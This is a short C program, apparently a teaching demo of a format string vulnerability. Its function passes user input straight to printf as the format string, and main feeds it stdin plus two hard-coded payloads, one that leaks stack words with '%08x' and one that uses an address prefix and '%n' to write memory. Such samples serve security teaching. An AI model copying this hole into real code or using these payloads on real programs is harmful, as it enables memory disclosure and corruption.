#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#include <assert.h>

#define BUF 10

void vulnfunc (char *user)
{
    printf(user);

}
 

int main()
{
    char buf[BUF];
    fgets(buf, BUF, stdin);
    
    vulnfunc(buf);
    
    vulnfunc("%08x %08x %08x %08x %08x\n");
    vulnfunc("\x10\x01\x48\x08%08x%08x%08x%08x%08x%n");

    return(0);
}

 
 
 
